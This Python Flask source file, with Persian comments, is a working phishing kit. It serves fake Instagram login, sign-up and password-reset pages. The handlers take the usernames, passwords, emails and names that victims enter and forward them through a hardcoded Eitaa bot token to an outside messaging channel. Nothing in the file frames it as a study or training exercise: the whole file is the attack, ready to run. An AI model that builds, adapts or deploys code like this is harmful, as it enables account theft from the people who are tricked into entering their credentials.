from flask import Flask, request, render_template_string, redirect
import requests  # اضافه کردن ماژول requests

app = Flask(__name__)

# توکن ربات ایتا یار و شناسه کانال
TOKEN = 'bot333725:b380f262-c3d2-4433-a16b-28dbc83c10ad'
CHAT_ID = '@post_sender'  # یا شناسه یکتای کاربر

# URL برای ارسال پیام به کانال ایتا از طریق ایتا یار
API_URL = "https://eitaayar.ir/api"

def send_message_to_eita(chat_id, message_text):
    url = f"{API_URL}/{TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message_text
    }
    response = requests.post(url, data=payload)
    return response.json()

@app.route('/')
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram Login</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background-color: #fafafa;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                background-color: #ffffff;
                border: 1px solid #dbdbdb;
                border-radius: 1px;
                padding: 20px 40px;
                text-align: center;
                width: 350px;
            }
            .logo {
                width: 175px;
                margin: 20px 0;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 9px;
                margin: 6px 0;
                border: 1px solid #dbdbdb;
                border-radius: 3px;
                background-color: #fafafa;
                font-size: 12px;
            }
            input::placeholder {
                color: #8e8e8e;
            }
            .btn-login {
                background-color: #0095f6;
                color: white;
                border: none;
                padding: 8px;
                width: 100%;
                border-radius: 4px;
                font-weight: 600;
                margin: 10px 0;
                cursor: pointer;
            }
            .btn-login:hover {
                background-color: #0077cc;
            }
            .separator {
                display: flex;
                align-items: center;
                color: #8e8e8e;
                margin: 15px 0;
            }
            .separator::before, .separator::after {
                content: '';
                flex: 1;
                border-bottom: 1px solid #dbdbdb;
            }
            .separator::before {
                margin-right: 10px;
            }
            .separator::after {
                margin-left: 10px;
            }
            .footer {
                font-size: 14px;
                color: #8e8e8e;
            }
            .footer a {
                color: #00376b;
                text-decoration: none;
                font-weight: 600;
            }
            .footer a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
            <form method="POST" action="/send_message">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="btn-login">Log In</button>
            </form>
            <div class="separator">OR</div>
            <div class="footer">
                <p>Don't have an account? <a href="/signup">Sign up</a></p>
                <p><a href="/forgot-password">Forgot password?</a></p>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/forgot-password')
def forgot_password():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Reset Password - Instagram</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background-color: #fafafa;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                background-color: #ffffff;
                border: 1px solid #dbdbdb;
                border-radius: 1px;
                padding: 20px 40px;
                text-align: center;
                width: 350px;
            }
            .logo {
                width: 175px;
                margin: 20px 0;
            }
            input[type="email"] {
                width: 100%;
                padding: 9px;
                margin: 6px 0;
                border: 1px solid #dbdbdb;
                border-radius: 3px;
                background-color: #fafafa;
                font-size: 12px;
            }
            input::placeholder {
                color: #8e8e8e;
            }
            .btn-reset {
                background-color: #0095f6;
                color: white;
                border: none;
                padding: 8px;
                width: 100%;
                border-radius: 4px;
                font-weight: 600;
                margin: 10px 0;
                cursor: pointer;
            }
            .btn-reset:hover {
                background-color: #0077cc;
            }
            .footer {
                font-size: 14px;
                color: #8e8e8e;
            }
            .footer a {
                color: #00376b;
                text-decoration: none;
                font-weight: 600;
            }
            .footer a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
            <form method="POST" action="/send_reset">
                <input type="email" name="email" placeholder="Email" required>
                <button type="submit" class="btn-reset">Send Login Link</button>
            </form>
            <div class="footer">
                <p><a href="/">Back to Login</a></p>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/signup')
def signup():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign Up - Instagram</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background-color: #fafafa;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                background-color: #ffffff;
                border: 1px solid #dbdbdb;
                border-radius: 1px;
                padding: 20px 40px;
                text-align: center;
                width: 350px;
            }
            .logo {
                width: 175px;
                margin: 20px 0;
            }
            input[type="text"], input[type="email"], input[type="password"] {
                width: 100%;
                padding: 9px;
                margin: 6px 0;
                border: 1px solid #dbdbdb;
                border-radius: 3px;
                background-color: #fafafa;
                font-size: 12px;
            }
            input::placeholder {
                color: #8e8e8e;
            }
            .btn-signup {
                background-color: #0095f6;
                color: white;
                border: none;
                padding: 8px;
                width: 100%;
                border-radius: 4px;
                font-weight: 600;
                margin: 10px 0;
                cursor: pointer;
            }
            .btn-signup:hover {
                background-color: #0077cc;
            }
            .footer {
                font-size: 14px;
                color: #8e8e8e;
            }
            .footer a {
                color: #00376b;
                text-decoration: none;
                font-weight: 600;
            }
            .footer a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
            <form method="POST" action="/send_signup">
                <input type="email" name="email" placeholder="Email" required>
                <input type="text" name="fullname" placeholder="Full Name" required>
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="btn-signup">Sign Up</button>
            </form>
            <div class="footer">
                <p>Already have an account? <a href="/">Log In</a></p>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/send_message', methods=['POST'])
def send_message():
    username = request.form.get('username')
    password = request.form.get('password')
    message = f"Login Attempt: \nUsername: {username} \nPassword: {password}"
    send_message_to_eita(CHAT_ID, message)
    return redirect('/')

@app.route('/send_reset', methods=['POST'])
def send_reset():
    email = request.form.get('email')
    message = f"Password Reset Request: \nEmail: {email}"
    send_message_to_eita(CHAT_ID, message)
    return redirect('/')

@app.route('/send_signup', methods=['POST'])
def send_signup():
    email = request.form.get('email')
    fullname = request.form.get('fullname')
    username = request.form.get('username')
    password = request.form.get('password')
    message = f"New Sign Up: \nEmail: {email} \nFull Name: {fullname} \nUsername: {username} \nPassword: {password}"
    send_message_to_eita(CHAT_ID, message)
    return redirect('/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2000, debug=True)
